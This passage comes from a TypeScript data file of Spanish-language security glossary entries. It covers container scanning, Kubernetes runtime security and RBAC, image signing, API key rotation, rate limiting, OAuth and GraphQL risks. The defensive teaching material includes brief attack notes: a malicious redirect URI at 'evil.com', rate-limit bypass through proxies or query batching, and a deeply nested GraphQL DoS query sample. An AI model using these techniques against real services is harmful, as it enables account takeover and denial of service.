    examples: ["Perímetro: projects prod+staging; policy: no crear bucket fuera del perímetro → evita exfil", "Access context manager: solo de corporate IPs → bloquea acceso desde cloud shell compromised"],
    related: ["Network isolation", "Seguridad de datos", "Zero trust"],
  },

  // ── M47 · Container Security ──────────────────────────────────
  {
    id: 500,
    module: 47,
    term: "Image scanning y vulnerabilidades en contenedores",
    short: "Escanear imágenes Docker/OCI para detectar CVEs en layers y dependencias.",
    detail: "**Docker image** = sistema de archivos + aplicación. Puede contener:\n- OS packages con CVEs (libc, openssl)\n- App dependencies con CVEs (npm, pip)\n- Secrets hardcodeadas (API keys en Dockerfile)\n- Ejecutables maliciosos\n\n**Herramientas**:\n- **Trivy** — Rápido, open source, detecta CVEs + secrets + misconfigurations\n- **Grype** — Syft para SBOM + Grype para scan\n- **Anchore** — Enterprise, compliance-focused\n- **Container Registry natives** — Google Container Analysis, AWS ECR scanning\n\n**Workflow**: Build → Test → Scan → Registry → Deploy\n\nSi scan falla (CVEs críticas), block push a registry.",
    examples: ["Image ubuntu:latest → Trivy finds 200 CVEs in openssl → base image outdated", "npm packages en image → transitive dependency malicious → detect + block"],
    related: ["CI/CD security", "Supply chain", "SBOM"],
  },
  {
    id: 501,
    module: 47,
    term: "Runtime security en Kubernetes",
    short: "Detectar comportamiento malicioso de contenedores en ejecución.",
    detail: "**Image scanning** = static (antes de deploy). **Runtime security** = dynamic (mientras corre).\n\n**Herramientas**:\n- **Falco** — IDS para K8s, detecta: shell access a container, file modifications, network anomalies\n- **Sysdig Secure** — Falco commercial + forensics\n- **Cilium + eBPF** — Network policy enforcement + visibility\n\n**Detecciones**:\n- Pod ejecutando shell interactivo (si no debería)\n- Process escaping container (privileged pod creando namespace nuevo)\n- Data exfiltration (large file copy to external IP)\n- Kernel module loading (rootkit)\n\n**Configuración**: Network policies (deny-all, allow ingress specific), Pod Security Standards (restricted, baseline)",
    examples: ["Falco alert: bash spawned in nginx container (anomaly) → kill pod", "Syslog: LD_PRELOAD injected → process hijack detected"],
    related: ["Kubernetes security", "Policies", "Detección de amenazas"],
  },
  {
    id: 502,
    module: 47,
    term: "Registry security y artifact attestation",
    short: "Proteger el repositorio de imágenes; asegurar que imágenes son firmadas por builder confiable.",
    detail: "**Registry** (Docker Hub, ECR, GCR) = almacén de imágenes. Riesgos:\n\n- **Credential compromise** — Attacker pushes malware image con tag conocido (shadow artifacts)\n- **Registry misconfig** — Public bucket o auth débil → anyone pulls private images\n- **Supply chain** — Imagen base tiene backdoor → todos los hijos heredan\n\n**Defensa**:\n- **Image signing** — Builder firma imagen con key privada; K8s valida firma antes de deploy (confinement)\n- **Attestation** — Provenance: quién construyó, cuándo, con qué source\n- **SBOM** — Bill of Materials (lista exacta de dependencias + versiones)\n- **Replication policy** — Solo ciertos registries permitidos (block Docker Hub)\n\n**Tools**: Notary/Cosign (signing), in-toto (provenance chains)",
    examples: ["Sign: `cosign sign gcr.io/myapp:v1.0 --key cosign.key`", "Verify: K8s ImagePolicy webhook rechaza unsigned images"],
    related: ["Supply chain security", "CI/CD", "Attestation"],
  },
  {
    id: 503,
    module: 47,
    term: "Kubernetes RBAC y network policies",
    short: "Control qué usuarios/serviceaccounts pueden crear/modificar recursos; bloquear tráfico inter-pod indeseado.",
    detail: "**RBAC** (Role-Based Access Control):\n- **Role** = permisos (create Pods, read Secrets)\n- **RoleBinding** = vincula Role a usuario/serviceaccount\n- **ClusterRole** = permisos cluster-wide\n\n**Anti-patrones**:\n- `admin` role a desarrollador junior → puede eliminar producción\n- `* on *` → acceso total (equivalent to sudo)\n- Serviceaccount default en namespace → heredados por todos los pods\n\n**Network Policies** (OSI layer 3):\n- **Deny-all default** — Bloquear ingreso/egreso\n- **Allow específico** — Solo el tráfico necesario (labeled pods)\n\n**Ejemplo**: ingress-controller puede recibir :80/:443 externamente, backend pods no. Backend pods pueden outbound a DB, no a Internet.",
    examples: ["RBAC deny: pod intenta crear otro pod → FORBIDDEN", "NetworkPolicy deny: pod intenta DNS outbound → blocked (si no en allowlist)"],
    related: ["Kubernetes security", "Least privilege", "Segmentación"],
  },

  // ── M48 · API Security ──────────────────────────────────
  {
    id: 510,
    module: 48,
    term: "API key management y rotation",
    short: "Proteger credenciales de APIs; rotar periódicamente para limitar exposure window.",
    detail: "**API keys** = tokens simples para autenticar llamadas (vs OAuth 2.0). Riesgos:\n\n- **Hardcodeadas en código** → GitHub scan tools las encuentran\n- **Clientes exponen** → app JavaScript deja key visible en network tab\n- **No expiran** → si leaked, acceso indefinido\n- **No scoped** → key con permisos máximos\n\n**Defensa**:\n- **Vault/Secrets Manager** (AWS Secrets Manager, GCP Secret Manager) — almacenar, no en código\n- **Rotation policy** — cambiar key cada 90 días (algunos proveedores autorotate)\n- **Scoping** — key solo para endpoint específico, método específico (POST /users/search, no full admin)\n- **Monitoring** — alertar si key usada desde IP nueva, geolocation anómala\n\n**Client-side APIs**: usar OAuth 2.0 PKCE, not hardcoded keys.",
    examples: ["GitHub scan: found AWS API key in commit → attacker uses before revoke → $50K bill", "Stripe key leaked → attacker processes payments against cards"],
    related: ["Secrets management", "OAuth 2.0", "Credential handling"],
  },
  {
    id: 511,
    module: 48,
    term: "Rate limiting y throttling",
    short: "Controlar velocidad de requests para prevenir abuso, brute force, y DDoS.",
    detail: "**Rate limiting** = límite de requests en tiempo (ej: 100 req/min por IP).\n**Throttling** = degradación de servicio (reduce calidad si excedes).\n\n**Técnicas**:\n- **Token bucket** — Acumulas N tokens/min, cada request gasta 1. Si vacío → rechazas.\n- **Sliding window** — Cuenta requests en ventana móvil (últimos 60s).\n- **IP-based** — Limitar por origen IP (fácil, eludible con proxies).\n- **User-based** — Limitar por usuario autenticado (mejor, pero complejo).\n\n**Estrategia**:\n- Público (no auth): 10 req/min por IP\n- Autenticado: 1000 req/min por usuario (free tier) vs 100K (enterprise)\n- Admin: sin límite\n\n**Bypass**: usar proxies/VPN (misma IP para muchas máquinas) → distribuye requests.",
    examples: ["Brute force: attacker tries 10K passwords/min → 1000 req/min limit → tarda 10 min vs segundos", "DDoS: 100K requests/min from botnet → load balancer drops > limit, otros usuarios sirven normally"],
    related: ["DDoS defense", "API abuse", "Fair use"],
  },
  {
    id: 512,
    module: 48,
    term: "OAuth 2.0, OpenID Connect (OIDC), y delegated auth",
    short: "Estándares para autenticación/delegación de autorización sin compartir passwords.",
    detail: "**OAuth 2.0** = autorización (\"qué puedes hacer\").\n**OIDC** = añade autenticación (\"quién eres\") sobre OAuth.\n\n**Flujo OAuth típico**:\n1. App redirecciona usuario a idP (Google, GitHub)\n2. IdP autentica (login)\n3. IdP redirige a app con **authorization code**\n4. App intercambia code por **access token** (backend-to-backend, seguro)\n5. App usa token para acceder recurso en nombre del usuario\n\n**Ventajas**:\n- Usuario no comparte password con la app (solo con IdP)\n- App obtiene scopes limitados (ej: solo leer profile, no borrar)\n- Revocación fácil (revocar token, no cambiar password)\n\n**Riesgos**:\n- **Redirect URI mismatch** — Attacker registers `https://evil.com` como legítimo redirect\n- **PKCE omitido** — Mobile apps SIN PKCE = vulnerable a interception\n- **Token leakage** — Token en URL fragment (log files, history)\n\n**Fix**: PKCE (Proof Key for Code Exchange) obligatorio, redirect URI whitelist stricta",
    examples: ["App: 'Login with Google'", "User approves → code to app → app calls Google backend → gets access token"],
    related: ["Autenticación", "Autorización", "SSO"],
  },
  {
    id: 513,
    module: 48,
    term: "GraphQL security vs REST",
    short: "GraphQL ofrece queries flexibles pero nuevas superficies de ataque (batching, introspection, DoS).",
    detail: "**REST** = endpoints fijos (GET /users/1, POST /users).\n**GraphQL** = single endpoint, cliente define query (máxima flexibilidad).\n\n**Riesgos GraphQL**:\n- **Query batching** — Enviar 100 queries en 1 request → bypass rate limit\n- **Introspection** — Query `__schema` → revelar estructura completa de API (reconnaissance)\n- **Deeply nested queries** — Query que anida N levels → O(2^N) complexity → DoS\n- **Circular references** — Query A que llama B que llama A → infinite loop\n- **N+1 queries** — Cliente pide 10 users + todos sus posts → backend genera 100 queries\n\n**Defensa**:\n- **Disable introspection en producción** (solo en dev)\n- **Query complexity analysis** — Rechazar queries > threshold\n- **Depth limit** — Max nesting levels (ej: 5)\n- **Rate limiting** — Throttle por complejidad, no por número de queries\n- **Timeout** — Query toma > 5s → kill\n- **Whitelist queries** — En mobile apps, pre-define queries (evita dynamic queries maliciosas)\n\n**Comparativa**: REST es más simple, GraphQL más flexible pero más riesgos.",
    examples: ["Introspection query: attacker descubre que schema tiene un campo `adminUsers` (no public)", "Nested query: { user { posts { comments { author { posts { comments... }}}}}}} → DoS"],
    related: ["API design", "Input validation", "DoS prevention"],
  },
];

export function definitionsByModule(moduleId: number): ConceptDefinition[] {
  return DEFINITIONS.filter((d) => d.module === moduleId);
}

export function getDefinition(id: number): ConceptDefinition | undefined {
  return DEFINITIONS.find((d) => d.id === id);
}
